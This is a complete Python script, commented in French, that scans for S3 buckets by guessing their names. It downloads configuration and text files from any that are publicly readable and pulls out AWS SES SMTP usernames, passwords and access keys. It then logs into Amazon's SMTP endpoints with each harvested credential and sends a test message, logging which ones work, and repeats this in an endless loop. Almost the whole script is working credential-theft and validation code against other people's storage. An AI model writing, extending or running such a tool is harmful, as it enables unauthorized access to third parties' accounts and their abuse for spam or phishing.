import smtplib
import socket
import ssl
import time
import json
import yaml
import logging
import boto3
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from botocore.exceptions import ClientError
import random

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def generate_bucket_names(count=100):
    """
    Génère une liste de noms de buckets S3 potentiels.
    
    Args:
        count (int): Nombre de noms à générer
    
    Returns:
        list: Liste de noms de buckets
    """
    prefixes = [
        "test", "backup", "config", "data", "public", "dev", "prod", "storage",
        "archive", "company", "app", "files", "logs", "assets", "media", "db"
    ]
    suffixes = [
        "bucket", "s3", "store", "data", "files", "backup", "config", "archive",
        "public", "test", "dev", "prod", "2023", "2024", "2025", "2026"
    ]
    separators = ["-", "", "_"]
    
    buckets = set()
    while len(buckets) < count:
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        separator = random.choice(separators)
        bucket = f"{prefix}{separator}{suffix}".lower()
        # Les noms de buckets doivent être valides (3-63 caractères, pas de caractères spéciaux)
        if 3 <= len(bucket) <= 63 and bucket not in buckets:
            buckets.add(bucket)
    
    return list(buckets)

def scan_public_buckets(buckets):
    """
    Teste une liste de buckets S3 pour vérifier s'ils sont publics.
    
    Args:
        buckets (list): Liste de noms de buckets
    
    Returns:
        list: Liste des buckets publics accessibles
    """
    s3_client = boto3.client('s3')  # Accès anonyme
    accessible_buckets = []
    
    for bucket in buckets:
        try:
            s3_client.head_bucket(Bucket=bucket)
            accessible_buckets.append(bucket)
            logger.info(f"Bucket public trouvé: {bucket}")
        except ClientError as e:
            if "403" not in str(e):
                logger.debug(f"Bucket {bucket} non accessible ou inexistant")
        except Exception as e:
            logger.error(f"Erreur pour {bucket}: {str(e)}")
        time.sleep(0.5)  # Délai pour éviter le rate limiting
    
    return accessible_buckets

def parse_file_content(content, file_name):
    """
    Analyse le contenu d'un fichier pour extraire les identifiants SMTP AWS SES.
    """
    credentials = []
    try:
        if file_name.endswith('.json'):
            data = json.loads(content)
            if isinstance(data, dict):
                smtp_user = data.get('smtp_username') or data.get('access_key_id')
                smtp_pass = data.get('smtp_password') or data.get('secret_access_key')
                region = data.get('region')
                if smtp_user and smtp_pass and region:
                    credentials.append((smtp_user, smtp_pass, region))
        elif file_name.endswith('.yaml') or file_name.endswith('.yml'):
            data = yaml.safe_load(content)
            if isinstance(data, dict):
                smtp_user = data.get('smtp_username') or data.get('access_key_id')
                smtp_pass = data.get('smtp_password') or data.get('secret_access_key')
                region = data.get('region')
                if smtp_user and smtp_pass and region:
                    credentials.append((smtp_user, smtp_pass, region))
        else:
            # Analyse des fichiers texte brut
            lines = content.split('\n')
            for line in lines:
                if 'smtp_username' in line or 'access_key_id' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        smtp_user = parts[1].strip()
                        for next_line in lines[lines.index(line)+1:]:
                            if 'smtp_password' in next_line or 'secret_access_key' in next_line:
                                smtp_pass = next_line.split(':')[1].strip()
                                for region_line in lines:
                                    if 'region' in region_line:
                                        region = region_line.split(':')[1].strip()
                                        if smtp_user and smtp_pass and region:
                                            credentials.append((smtp_user, smtp_pass, region))
                                            break
    except Exception as e:
        logger.error(f"Erreur lors de l'analyse du fichier {file_name}: {str(e)}")
    return credentials

def explore_s3_bucket(s3_client, bucket_name):
    """
    Explore un bucket S3 à la recherche de fichiers contenant des identifiants SMTP.
    """
    credentials = []
    try:
        paginator = s3_client.get_paginator('list_objects_v2')
        for page in paginator.paginate(Bucket=bucket_name):
            if 'Contents' not in page:
                continue
            for obj in page['Contents']:
                key = obj['Key']
                if key.endswith(('.json', '.yaml', '.yml', '.txt')):
                    try:
                        response = s3_client.get_object(Bucket=bucket_name, Key=key)
                        content = response['Body'].read().decode('utf-8')
                        creds = parse_file_content(content, key)
                        for cred in creds:
                            credentials.append((cred[0], cred[1], cred[2], bucket_name, key))
                    except ClientError as e:
                        logger.error(f"Erreur lors de la lecture de {key} dans {bucket_name}: {str(e)}")
                    time.sleep(0.5)  # Délai pour éviter le rate limiting
    except ClientError as e:
        logger.error(f"Erreur lors de l'exploration du bucket {bucket_name}: {str(e)}")
    return credentials

def check_smtp_server(host, port, use_ssl, use_tls, username, password, from_email, to_email, test_index, bucket=None, file_key=None):
    """
    Vérifie la configuration d'un serveur SMTP et envoie un email de test.
    """
    result = {"index": test_index, "status": False, "message": "", "logs": [], "username": username, "host": host, "port": port}
    if bucket:
        result['bucket'] = bucket
        result['file'] = file_key
    
    try:
        socket.setdefaulttimeout(10)
        if use_ssl:
            context = ssl.create_default_context()
            server = smtplib.SMTP_SSL(host, port, context=context)
        else:
            server = smtplib.SMTP(host, port)
        
        server.set_debuglevel(1)
        result["logs"].append(f"Connexion tentée à {host}:{port} pour {username}")
        
        if use_tls and not use_ssl:
            server.starttls()
            result["logs"].append("STARTTLS initié")
        
        server.login(username, password)
        result["logs"].append("Authentification réussie")
        
        if from_email and to_email:
            msg = MIMEMultipart()
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = f'Test SMTP - Vérification #{test_index}'
            body = f'Ceci est un email de test pour {username} via {host}:{port}.'
            msg.attach(MIMEText(body, 'plain'))
            server.sendmail(from_email, to_email, msg.as_string())
            result["logs"].append("Email de test envoyé")
        
        result["status"] = True
        result["message"] = "Connexion SMTP et test réussis"
        
    except smtplib.SMTPAuthenticationError:
        result["message"] = "Erreur d'authentification"
    except smtplib.SMTPConnectError:
        result["message"] = "Erreur de connexion au serveur SMTP"
    except socket.gaierror:
        result["message"] = "Erreur DNS: Échec de la résolution du nom de domaine"
    except socket.timeout:
        result["message"] = "Timeout: Le serveur n'a pas répondu"
    except Exception as e:
        result["message"] = f"Erreur inattendue: {str(e)}"
    finally:
        try:
            server.quit()
            result["logs"].append("Connexion SMTP fermée")
        except:
            pass
    
    return result

def write_report(results, output_file="smtp_report_s3.txt"):
    """
    Écrit un rapport des résultats dans un fichier.
    """
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(f"\nRapport de test SMTP - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 50 + "\n")
        for result in results:
            status = "Succès" if result["status"] else "Échec"
            f.write(f"Test #{result['index']} - Utilisateur: {result['username']}\n")
            f.write(f"Serveur: {result['host']}:{result['port']}\n")
            if 'bucket' in result:
                f.write(f"Bucket S3: {result['bucket']}\n")
                f.write(f"Fichier: {result['file']}\n")
            f.write(f"Statut: {status}\n")
            f.write(f"Message: {result['message']}\n")
            f.write("Logs:\n")
            for log in result["logs"]:
                f.write(f" - {log}\n")
            f.write("-" * 50 + "\n")

def main():
    # Configuration SMTP
    smtp_config = {
        "ports": [(587, False, True), (465, True, False)],  # (port, use_ssl, use_tls)
        "to_email": "test@example.com"  # Email de test (destinataire)
    }
    
    # Initialiser le client S3 (accès anonyme)
    s3_client = boto3.client('s3')
    
    test_index = 1
    batch_size = 100  # Nombre de buckets à générer par itération
    
    logger.info("Démarrage du scanner S3 en boucle continue. Appuyez sur Ctrl+C pour arrêter.")
    
    try:
        while True:
            # Étape 1 : Générer des noms de buckets
            logger.info(f"Génération de {batch_size} noms de buckets...")
            buckets = generate_bucket_names(batch_size)
            logger.info(f"{len(buckets)} noms de buckets générés.")
            
            # Étape 2 : Scanner les buckets pour trouver les publics
            logger.info("Scan des buckets pour vérifier l'accès public...")
            public_buckets = scan_public_buckets(buckets)
            logger.info(f"{len(public_buckets)} buckets publics trouvés: {public_buckets}")
            
            # Étape 3 : Explorer les buckets publics pour trouver des identifiants SMTP
            s3_credentials = []
            for bucket in public_buckets:
                logger.info(f"Exploration du bucket {bucket}...")
                creds = explore_s3_bucket(s3_client, bucket)
                s3_credentials.extend(creds)
            
            logger.info(f"{len(s3_credentials)} identifiants SMTP trouvés dans les buckets.")
            
            # Étape 4 : Tester les identifiants SMTP
            results = []
            for smtp_user, smtp_pass, region, bucket, file_key in s3_credentials:
                host = f"email-smtp.{region}.amazonaws.com"
                for port, use_ssl, use_tls in smtp_config["ports"]:
                    logger.info(f"Test #{test_index} pour {smtp_user} (S3) sur {host}:{port}")
                    result = check_smtp_server(
                        host, port, use_ssl, use_tls, smtp_user, smtp_pass, smtp_user,
                        smtp_config["to_email"], test_index, bucket, file_key
                    )
                    results.append(result)
                    test_index += 1
                    time.sleep(1)  # Délai pour éviter le rate limiting
            
            # Étape 5 : Écrire le rapport
            if results:
                write_report(results)
                logger.info("Rapport mis à jour avec les nouveaux résultats.")
            
            # Pause avant la prochaine itération
            logger.info("Fin de l'itération. Nouvelle itération dans 5 secondes...")
            time.sleep(5)
            
    except KeyboardInterrupt:
        logger.info("Scanner arrêté par l'utilisateur.")
    except Exception as e:
        logger.error(f"Erreur critique: {str(e)}")

if __name__ == "__main__":
    main()